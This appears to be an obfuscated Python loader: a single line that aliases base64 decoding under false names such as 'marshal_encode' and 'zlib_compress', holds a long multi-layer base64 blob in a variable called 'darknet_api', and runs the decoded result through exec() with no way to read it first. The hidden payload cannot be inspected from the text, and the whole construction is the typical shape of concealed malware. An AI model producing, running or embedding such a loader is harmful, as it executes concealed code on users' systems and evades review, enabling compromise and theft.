from base64 import b64decode as marshal_encode;from base64 import b64decode as zlib_compress;from base64 import b64decode as obfuscate_import;darknet_api = "VmpJd01WTXlVblJUYkZKU1lXdEthRlpxVG05ak1YQkdXa2M1YTJKVmNIZFZWelZEWVZaa1JsTnFTbHBOYWxaVFYycEdZVk5HV25WVWJVWlhUV3hKTVZZeFdtcGxSa3BJVTJ0b2FWSXphSEJaYlhoSFpXeE9WbUZGT1U5V01IQXdWa1pvVDFOc1NYaFhXR3hZWWtkTmVGUlZaRTlOTWs1SVRWZHdhVlpIZDNkVk1WWnZWVEpLU0ZOcmFGZGhhMHB2Vlc1d2MwMVdVa2hPVms1cVRVaG9NRll5Y0VkaFYwcFdUa2hrV2xadFRURmFSbVJQVGxVMVdWVnRSbGhTVkZVeVZqRmFhMkV5U2toVWFsWlNZbXRLY0ZZd1ZrdE5iR3Q1VGxaS1lVMVZiRFZXYlhCRFZrWkplV1ZFV21GU1YwMHhXbFprVjFZeFRuUmxSM0JZVW14d2VsZFljRTlWYlUxM1lrVmFZVkl6YUhKVmJGWjNUV3h3Umxack9XaFNNSEJKV2xWa2MxZHNXWGRPV0d4V1ZtMU5lRnBYTVZKbFZscDFZa1phYVZac2J6QlhhMXByVmpKV2RGVnJTbXBTZWtaeFdXeFNjMDFHVGxaaFJrNXBVakJ3U1ZadGNFTmhSa28yWWtSR1ZWSjZSbGhhVm1SUFpFVTVXV0pIY0d4V1ZYQXpWMWQ0YjFFeVVuUlVibFpXVmpKU1YxUlhlR0ZPYkd3MlUyNU9hMkpWY0hwVlZ6RnZZV3N3ZDA1SWNGcGhhelZNV1ZSR1UyUkdXblJsUjBaVFRWWndlVlpYZUc5VE1sWllVMWh3VkZaWVVtaFpiWFIzVFd4c2MxUnJUazVTTUZwWlZGWmtORk5zU1hsbFJFSmFUVWROTVZwV1pGTlNSa1oxWTBkc1UwMVdjSHBYVkVKSFpESk9TRk5zYkZKaWJIQnhXVzE0UjJKc2EzbE5WbVJzVWpGS1dWWnROWGRoTVU1R1RWaHdWRlpYVWpOYVZ6RktaVlUxU1ZScmNGUlNXRUo2VmtWV1QxRXlWblJXYkd4VlYwVTFTMVZ1Y0hOT2JFVjVXa2hrYWxKdVFuZFZWelZYWVZVd2VGSnROVnBoYXpWUFdrWmtUMU5HU25GUmJXaFNaV3hhZWxkc1ZtdGpNbFowVld0c1ZWWjZiRXhVVkVFeFl6RnNObFJyT1dwU01HdzFWR3RqTVZSR1draFBWWGhVVmxVMVExZHFRbk5UUlRsWlkwVXhhVlpGV25aWFZsSkxWakpGZVZKc2JGUmlia0pOVlZSS1UwNXNaSE5oUlRsc1lsVmFXVlF4YUZkVE1sWllaRVY0VWsxcVFURmFWM1EwWkZaU2NWWnRjRTVOVlhCNlYxZDRUMkp0UmxkaE0yeHNVak5vWVZZd1ZuTmpSazE0VW01YVZFMUZOVEJXVnpFMFdWZEdWbE51UWxoV2JVMTRXa1phZDFkV1RsaFBWWGhYVW5wc1RWVXhWazlSYkc5M1lrVm9WR0pYYUhCWmJGSlhZekZyZVdKRlNsQldWM2hGVlRGa2MxTnNiM3BSYlhCaFZsWktTRmxXV210T2JFWlZXa1UxYkdFd1ZYcFdSM1JUVkRKU1NGZHJWazVTUjNoU1ZtdFNRazVXVmtkVldHUlFWbXRLVmxSVlVuTlZWbHBGVVZSV1ZsSnNSak5VTVZwRFZsVXhSV0pHUmxkU1JVVXhWbFZhVW1Rd09WZFJiRlpPVWtkNFVsWnJVa0pPVmxaSFZWaGtVRlpyU2xaVVZWSnpWVlphUlZGVVZsWlNiRVkwVkRCYWIxTldiM3BoUm5CcFUwVTBlbGRYZUU5UmJHOTNWRzVPYkZKR1NrOVdha0ozWVZaU1ZsVnVjR3hoZWtaR1dUTndRMVJyTVhGU1ZGSllVbGRvZFZwVlduTmpNazE2WVVaQ2JHRjZSVEZXUkU1M1ZXMVJlVk5zVWxKV01sSkxWVlJDUjJKc1RsWlVhMHBoVFVkNFJWVlhNVTlpUmtwR1YyNUNWMDB6UWtkVWFrRjRUbXhPVlZwRk9WTlNWbTkzVm1wT2MxRXhWbFppUlZwaFRXMVNVMXBXVmtkTlJrNVdWbGhrWVUxVldsVlZWM1EwVTJ4S1dHUkhOVlpXTW5oRVZsVldjMUl4VmxoYVJteFVVakpSTUZZeFpEUmxiVlpHVDFSYVZWZEhlRkZhVjNoSFRURnNjMVJyU21GTlIzaEZWVlprYTFOc1JYZFNiVFZVVmxadk1GUnJWWGhYUms1MFUyczFVMU5GTkRKV1JsWlRaV3N4UmsxSWJFNVdSMmhhVlRCa2EwNUdaRmhsU0hCclRXdHdVMWt3WkU5aVJrcEdWMjVDVjAwelFrTlVha0Y0VG14R1ZWcEZPVk5TVkZWM1YyMTBZVTVGTlVaTlZtaFVZbFZ3VDFwWE5VOU9iRkpYVlc1d1RsSlVSa2xVVldSclUyeEZkMUp0TlZSV1ZUVkRWMnBDYzFKR1JuTldiV2hUVFc1bk1sVXhWbTlVTWtaMFZHNVNhVk5IVW5KVlZFSkxaREZyZW1KRlRtdFdNR3cyVmxaa2ExbFhTbFZpUkZaVVZsZG9VRmxWWkV0VFJscFlZVVZ3VWsxRlduVlZNVlpQVVd4dmVHRkZiR0ZOTW1oaFdXdG9UMDB4VVhwalJUVnJUVVJyTWxaV2FIZGhWbVJKWVVkd1lWWldTa2haVmxwclRteEdkVlZyVW1sVFIyTjNWa1phYTFNeGJISk5WVlpxVFROQ1QxVnJhRTVrTVZKVlUxaG9VRkp0YUVwWGFrNXZWMjFLU1ZScVRscGlSVFZEVjJwQ2MxSkdSbGhhUlhCU1RVVmFkVlV4Vms5UmJHOTRZVVZzWVUweWFHRlphMmhQVFRGUmVtTkZOV3hXVkdzeVZsWm9hMkZXVlhkU2JUVlhVbTFTU0ZsdE1VWmxWa3AxVVcxd1RtRXhXblZYVnpCNFlUSkdTRlpzYUZCWFJscG9XbFpXUzFJeFZsVlNhMXBoVFVkNFNGcFZVbE5VYkZsM1kwZHNWVlpYVGpOWGFrSnpVa1pHV0ZwRmNGSk5SVnAxVlRGV1lVNUZOVVpOVm1oVVlsVndUMVZyYUU5T2JGSldWVzV3VGxKVVFqVlVWbEp2VjFaT1NGcEVVbGhXTTJnMldrUktTMVZ0VGtoVWJYaFRVbFp3ZDFacVRuZFJhelIzVFZSYVVsWkhVbEJWYTFVeFRVWndjbFZZWkZCV2EwcFdWRlZTYzFWV1drVlJWRlpXVW14R00xUXhXa05XVlRGRllrWkdWMUpGUlRGV1ZWcFNaREE1VjFGc1ZrNVNSM2hTVm10U1FrNVdWa2RWV0dSUVZtdEtWbFJWVW5OVlZscEZVVlJXVmxKc1JqTlVNVnBEVmxVeFJXSkdSbGRTUlZVd1ZqQldiMkp0VmtkaVNFNXFUVEpTY0ZaVVFrZFVSazVXVkd0S1lVMUhlRVZWVm1SclUyeEZkMUp0TlZSV1ZuQTJWMnBHUzFKck9WWmhSazVXVFVWd1YxZFdXbXBsUjBwR1lrVmFXR0pYYUhKV2FrRXhZekZ3UmxSclRsZFNiWFEyVlRJMVEyRnNUa2RTYlRWWVVtdGFNbGxXVm5OalJrNVdaRVZ3VWsxRlduVlZNVlpyV1ZkU2RGUnVRbEppV0VKdlZXcENZVTVXVGxaYVNFNXJWbGQ0U1ZVeU1XOWhWMHBWVm01T1drMXVRakpWZWtKelVrWkdXRnBGY0ZKTlJWcDFWVEZXVDFFeVZuUldiR3hWVjBaYWNWUlVSa3RqYkd4eFZHeGtUbEpZYURGWGEyaHpZVVprUjFOdVRsUk5SMUpRV1dwR2MxZFdUbGxSYTFKb1ZsVmFkVlV4Vms5UmJHOTNZa1ZTVWxZeVVuRlVWRW8wVG14U1NFNVZPVTVTYmtKSlZERlNSMkV4UmpaV2JsSmFZVEpvV0ZwWE1VZFNSbTk2VVd0U2FGWlZXblZWTVZaUFVXeHZkMkpGVWxKV01sSnhWRmMxYjJNeFpITmhSVXBwVFVSR1JWUnJhR3RVYkZWNVpFVjRVazFxUmt4WlZXUkxaRVUxV0dWSGNHaFdNbEl6VlZSSmVGSXlVWGxTYkdSUVYwVkthRlZVUWtaT1ZrNVdWRzF3YkZKVVJUSlZiRkpUVkd4S1NGa3phRlJpYlZJeldWVmtUMU5IU2toWGJXaFRUVVp2TWxkV1ZrOVJhemxXWWtWU1lWSXphRTlhVjNoeVpVWmtWMXBHY0d4V2JrSjRWbXhTUjFkdFNsZFNXR2hWVFZkU1VGbHNWVEZPYkhCSVlVWndiR0pXU25oV1JscFRWV3MxVms1V1ZtaE5NbWhvVld0YVMyTnNVbkpVYlhCVVRXczFTVmxWYUdGaFYwcFhWMjB4V21KVVZsaGFSVnB6WkVaYWRXSkZjRk5TUlVwMVYxWmFhazFYVVhsVmJHeFdWbnBzUzFscldrdGpNV3h5V2taa2FXSlZOVEJWYlRWVFUyeEtWVlpZYUZwaVIxSk1XV3RrVDJOR1JuUlRhM2hzWWtkM01sWnFRbUZpTVdSWFdrVmthRkp0ZUZsVmJURnZWMnhaZDFkWVpHRk5SR3gzVlZaa2MxUkdWbGhQVlhoWVZrVnZNRmt3V25kWFJUVlZVV3R3VTFKRlNuVldiWFJyVmpKTmVHTkdhR0ZUUjNoaFZtNXdSMUpXYkhKYVNFNXBVakJ3TVZaV1l6VlRNREIzVGxoT1dtVnJOVkJaTUdSS1pWVTFTVmRyZEd4V1ZWbzFWVEZXYjFFeVNYbFRXR3hQVmpOb1dsUlhjRlpsUm14eldrVjBhVkl3TlhkYVJFcHJWMnhrUmxOdVpGaFNSWEI2V1ZSQ05GSkdSblJoUjNCVFRXNW9kRmRXVm10U01sWjBVbXRTYUUxSVVtRlVWelZ2WkRGa2MxbDZSazVTV0dnd1ZrYzFZV0ZYU2xWV2JrNVlWa1UxVTFscVFqQlZiVTVKVVcxR2FGWlZiM2hYVjNCUFZXeHZlR0V6Ykd4VFJVcG9WbTV3Vm1ReFVraE5XRTVzWWtka05sWnROWGRaVm1SR1kwY3hXRlp0YUZoVVZXUkhVMFU1V1dKSGFGaFRSVXA2VmpKMFQySnRUa1pQVnpWcFRXMVNTMVZVUWtkaWJIQkdZVVYwVDFaVWJIVlpha3ByVTJ4RmQxSnROVlJXVlRWRFYycENjMU5HVW5WVWJXaFhUVlp2ZUZkclZrNU5WMVp6WTBab1QxWXpVbHBVVjNNeFRXeGtjbHBHWkdGaVZUVXdWbTAxYjJFeFdYaFhhbHBoVWxVMWRscEVTa2RUUlRsWlZtMUdWMkZ0ZDNoWGExcHFaVWRHVjJOR2JGUlhSVXBGV1ZaV1IySnNUbFpVYTBwaFRVZDRSVlZXWkd0aFZsbDRWbTAxVmxKck5VUlpWekZMVTBkS1NHVkhiR2xpUlZsNFYxaHdTMk15U25SVGJrNVFWMFZLY0ZsV1pHOU5NV3hXV1hwV2ExWnVRbGhVTVdoWFlURmFObEp1UWxoaVIyaExXWHBDYzFOSFNrbFdiWEJVVW14c00xVjZRazloTVVwMFUyNVdWbUpZYUhGWlZsWkxWbXhrYzFwRVVtbFNiVGsyVlRJeGIyRldWWGRUYTFaYVlXdHdWRmxyVm5OU1YwbDVXa1YwYkZZelVqTlZWRXB6VVd4dmQySkZVbEpXTWxKTFZWUkNSMkpzWkhSTldFNXNWakF4TmxaV1pHdFZWbFYzVTJ0b1dGWnRVVEJhVjNoM1ZXMUplVnBGY0ZKTlJWcDFWako0YjJJeVJuTmpSbXhTWVd0S1MxVnRjekZqTVd3MlZHczVhbEl3YkRWVWJGcEhWMnhrUms1VVdtRlNSV3N4V2xaYWQxSnJOVmhsUjBaWFRWVndlbFl5ZEZkV01sWllWRzVTVUZkSGVGRlhha2sxWW14T1ZsUnJTbUZOUjNoRlZWWmthMU5zVGtaVGJUbGFaV3MxVUZSVVNrcGxiRTUwWkVWd1UxSkZTblZYVmxwcVRWZFJlVlZzYkZaV2VteE1WRlZhWVUxV2NFWmFSbVJzVmxkNFNGVlhNVzloYXpCM1RraHdXbUZyTlV4WlZFSnpVbFpPZEUxV2NGWk5SVnAxVmxWa2RrMUdiM2RqUkZab1RVaFNTMVZVUWtkaWJFNVdWR3RLWVUxSGVFVlZWelZUV1ZaVmQxSlVWbFJXVjFKUVdYcEtSMWRHV25WV2JYUlNaV3haTWxkclZtdFNNbFpZVld0U2FGTkhVbTlWYm5CelRWWmtjMWRVVm10V01VcFpWRlprYzFsV1pFWmlTSEJVVmxkb1JGbFZaRTVsYkZKeFZHMXNUazFJUW5sVmVrWkhaR3hOZVZOc2JHbFRTRUpvVm1wT2IyUkdUbFpWV0dSaFRWZDBOVnBWYUVOWlZsbzJWbGhrVlZKNlJuSlphMlJUVWpBNVdWVnRSbFpOYlZJelZWUkpNVkV5VmxoU2JHaFBWa1ZLVFZWVVFuZFhWbVJ6V2tSU2FHSlZiRFZVVm1RMFUyeEtWVkpxVmxWU1JVWTBXbFprVDA1Vk5VaGlSWEJTVFRBMWRWZFhlRzlqTWxaelkwWm9iRko2Ums1WmJHaHZZakZzTmxSc1RtRmlWWEF3VlcwMVUxbFdWWHBhUnpWWVlrZE5lRmxVUmtOV1JrNTBWRzF3YUZaWGVETlZWRWt4VVRKV1dGSnNhRTlXUlVwTlZWUkNkMkZzYkhSa00yUlFWbXRLVmxSVlVuTlZWbHBGVVZSV1ZsSnNSak5VTVZwRFZsVXhSV0pHUmxkU1JVVXhWbXBPYzFFeFNraFRhMmhUWW10S2NGWnFTalJOVm1SMVlrVk9WMUl4U2tsVmJUVnpZVEZGZDFOdGRGWlNiRVl6VkRGYVExWlZNVVZpUmtaWFVrVkZNVlpWV2xKa01EbFhVV3hXVGxKSGVGSldhMUpIWVZaT1dHSklTbFJOUlRWMVdUQmtNRmxXV1hoaVJ6VllWa1Z2TUZsVlpFZFhSVEZJVDFad1RtSlhhSFpYVnpCM1RWZEtTRk5yWkZCWFJVcG9WVlJLZWsxc1JYbGlSVXBoVFVkNFJWVlhNWGRoUmtsM1YycEdXbUpVUmxoWmVrSnpVbFV4U0ZwR2NFNWlWMmgyVjFjd2QwMVhTa2hUYTJSUVYwVkthRlZXWXpWaWJFNVdWR3RLWVUxc1NrcFZNbkJYVlVadmVVOVhOVlJXVlRWRFYycENjMUpHUmxoYVJYQlRUVVJXTWxZeFdtcE5WMUpYWTBab2JGSXhjR2hXYm5CV1pERnNWMkZHVGs5V1YzaEdWRlZrYTFkck1YVmhTR1JZWWtkTmVGUlZWalJrUm5CSVpVZDBVMkZ0ZUhwWFZ6QXhWVEpPU0ZWcmJHaE5hbXhoVkZjeGIySXhiSFJOUkVacFVqQndSVmxVUWpCVGJFVjNVbTAxVkZaVk5VTlhha0p6VWtaR2RWcEhjR2xXTTJkNFYydFdUMkp0UmxkV1dHeFhZbXhhYUZWcVNqUk5WbVIxWWtWT1UxSXdjRWxWYlRWRFlWWlZkMU5yVWxwaGEydDRWRlprVDA1V1JsbFdhM0JTWld4S2RWWkZaSE5SYkc5M1lrVlNVbFl5VWt0VlZFSkhZbXhPVmxSclNtRk5SM2hGVlZaa2ExTnNSWGRTYlRWVVZsVTFRMWRxUW5OU1JrWllZa1V4VWsxRmNIcFhWekI0VldzNVZtSklUbXhUUjNoTFdWWmtNRlJHVGxaVWEwcGhUVWQ0UlZWV1pHdFRiRVYzVTJwYVdtRXlVbGhaYTJSUFVrWnZlbU5GZUZaV2VteDFWVEZXVDFGc2IzZGlSVkpTVmpKU1MxVnFRVEZsYkd4WFdrWmthMVl4U2tWVWJHaDNXVlphTmxadVNsaFNSV3cwV1d0a1RtVnNVblJoUjBaT1lrWmFNbFl5ZUdwTlZURklVbXhzVm1Gc1dsSldha0V4Wkd4a1YxbDZSbXRXYmtKWldsVmtZVmxXV2paV1dHUmFWbTFvVkZSc1ZqUlNSa1oxVlcxR1dGSlVWVEpXTVZwcllUSktSMUZzVWxWVFIxSXhWR3RTWVZFeFRsWldhemxxVFZkNFdWbHJhRk5UYkVwV1kwUktXbUpVVmxoYVYzUnpZMGRGZDJSRmNGSk5SVnAxVlRGV1QxRnNiM2RpUlZKU1ltNUNjRlZxUm1Gak1XdDNWRzAxVGxaWVVsTlpha3ByVTJ4RmQxSnROVlJXVlRWRFYycENjMU5IUmtsUmJYQk9UVlZ2ZVZkVVNURmpiRzk0VVd4U1VtSllRbkJWYWtvMFl6RnNkRTVXU21sTlJUVjNWVlprYTFOc1JYZFNiVFZVVmxVMVExZHFRbk5TUmtaWVdrVndVMVl4U25wWGExWlhZakpPU0ZSWWNGWmliSEJ4V1cweE5GWkdaSE5oUldST1ZtNUNXbFpIY0VOVVJrNUdVMjVPV0dKSGFFdFVNVnB5WlZkR1NHRkhiR2xXUmxwNlYxZDBXazVYU2toVGJsWldZbXRLY2xVd1pEQmxiRTVXV2tSU2FsSXdjRmxaYTFKRFZWWmFSbUpJY0ZSV1YwMHhXV3hhZDJSV1VuUmxSM1JUWVcxNGVWWXhXbTlWTWtwSFVXeGFUMWRHY0hCWmJGcFhaV3hPVmxsNlZtbFdia0l4VmtjeE5HRXhTbkZpU0dSWVlURkdNMXBFUWpSU1JrWjFWVzFvVjJWc1duUlhWbHByVldzNVZrMVZVbXROYlZKd1ZtcENXazFHWkVWVGJrNW9UVlZLVmxWV2FFOVNSMFpXVW0wMVZGWlZOVU5YYWtKelVrWkdXRnBGY0ZKTlJWcDFWVEZXVDFGc2IzZGlSVkpTVmpKU1MxVlVRa2RpYkU1V1ZHdEtZVTFIZUVWVlZtUnJVMnhGZDFKdE5WUldWMUpJV1ZSR2QxSXdPVmxYYlVacFZtNUJNbFl5ZUc5VmF6bFdUVlZTYTAxdFVtOVZha0poVG14c1ZsVllaR3ROU0ZKVldWUkNNRk5zUlhkU2JUVlVWbFUxUTFkcVFuTlNSa1oxVlcxR1dGSlVWVEpXTVZwcllUSktSbUpGVms1U01sSnZWV3BLTkU1c2NFWlplbFpzVmpGYVZWUnNhRk5aVm1SR1RsUmFXRlp0VW5KWmEyUk9aVWROZW1GR2JGWmxiRmwzVmpKNGIxUXlWbk5pUm1oaFVqTm9SVmxXVmtkaWJFNVdWR3RLWVUxSGVFVlZWbVJyWVVaWmVHSkhOVnBpUjFKWVdsY3hUbVZXU25ST1YwWldaV3hhTUZkV1dtcE5WMFYzWkVWU1ZHRXhTbkJVVjNCWFpGWnJlVTFWWkU1U01VcFpXbFZrYjJFeFNYbGxSRXBhWWxSV1QxbFdWakJXVjBsM1pFVndVazFGV25WVk1WWlBVV3h2ZDJKRlVsSldNbEpMVlZSQ1IySnNiSE5hUm1Sc1lsVXhOVlZ0TURGWlZsVjNVbFJXVkZaWGFFeFphMVkwWkVaa2RWRnRiR2xXYTNCMlYxZDBhMDB5U1hkaVNFNXFUVEpTVGxaclpEQk5WbVJIVkc1d1lVMVZjRWRVTVZadlZURlZkMkpJY0ZSV1YwNDBXV3RrVG1Wc1VuUmhSMFpPWWtaYU0xWnFUbmRSTVhCR1ZHNUNVbFl5VWt0VlZFSkhZbXhPVmxSclNtRk5SM2hGVlZaa2ExTnNUa1pUYWxaYVZtMU5lRlJWVmpCU1JrNTBVMnQ0YVZKRlNuVldiRkpQVmpKR2MyRXpiRmRpYmtKeFZGZDRkbVZHYkhKYVJGSlBWbGQ0UjFaSE5VOVhiRmw1WlVSQ1ZGWldTakpYYWtKelkwWkdXVk5yY0ZSU1ZGSXpWMVJLYzJJeVVrZGpSbXhWWW01Q1lWWnFTbE5qTVUxNFZHNUtWRTFIZUVWVlZtUnJVMnhGZDFKdE5WUldWVFZFV1d0a1MxTldVblJsUmtKaFRXcHNkVlV4Vms5UmJHOTNZa1ZTVWxZeVVrdFZWRUpIWW14T1ZsUnJUbXROYXpVd1dXdG9WMkV4UlhsaFJFSllZa2RvVUZwWGVITlhSbkJJWlVWNFZsWjZiRTFWTVZaUFVXeHZkMkpGYUZkaGJFcGhWRmQ0WVUweGNFWlVhMDVUWWxaYVNWWkhNVFJoYkU1SFUyNWtXbUZyYTNkWGFrWnpWMVpTV0ZwSFJsZFNlbXhOVlRGV1QxRnNiM2RpUlZKU1ZqSlNTMVZVUWt0Tk1XdDVUVmhPYTFZeFNrVlhha3B6VjBkV1dWRnRkRlJXVmxwNVdXMHhTMVpHUm5SbFIzaFVVbFZ3ZWxkVVNYaGpNa3BJVTI1U1ZXSnJTbkJaYkdSUFlteHNObE5VVm10U2JrSlZWVmN4TUZsV1dYcGhSemxoVm1zMVExcEdWbk5TUlRWSVdrVXhhRlpYZUROVlZFcHJaR3hOZVZWWWJHaFRSVXB3VldwR1YySnNXbkpoUlhST1ZtNUNWbGxxUWpCVGJFVjNVbTAxVkZaWGFGQlpla1ozVjBaYWRWcEZlRk5TVmxvelZWUktjMUZzYjNkaVJWSlNZbGhDY0ZWcVFtRmtNV3h6VkcwMWFGWnJXa2RXVjNoRFZUQXhSMWR0TVZkaE1sSjZXa1ZhZDFZd09WWmFSbkJZVW14d2VGWXllRzlWTVhCellraFNVRlpGU2t0WlZtUXdWRVpPVmxSclNtRk5SM2hKVmpJMVlXRnRSbFpUYm1SVVZsZFNlbHBHVm5OVFZrNTBZVWRzYVZZeFNucFZla0pUVjIxUmQyUkdWbWxOU0ZKTFZWUkNSMkpzVGxaVWEwcGhUVWQ0UlZWWE5XdGhiVXBZWlVSR1lWSlZOWFphVnpGVFUxWk9XRTlYYUZaTmJsSjFWWHBPYzFGdFJsWmxSRnBZVjBkU1MxVXdWVEZqTVdSVlUxUldhMVp1UWtwV1JtUnJZVEZhTmxaWVpGcFdiVkY2VjJwS1MyUkdXbkZWYlhSU1RVVndlRmRYZEd0U01rNUlVMnhTVWxkR1drdFZXSEJUWW14U1NHSkZTbUZOUjNoRlZWWmthMU5zUlhkU2JUVlVWbFUxUTFkcVFuTlNSa1pZV2tWd1VrMUZXblZWTVZaUFVXeHZkMkpJUW10TmJWSm9WbTV3VjJOc1ZrZFVhM1JhVFdzMWQxVXhhRU5TUjBaV1VtMDFWRlpWTlVOWGFrSnpVa1pHV0ZwSGNFNWliV2g2VmpKNGIxRnRTWGROVmxKb1RVaE5PUT09";exec(marshal_encode(zlib_compress(obfuscate_import(zlib_compress(obfuscate_import(darknet_api))))))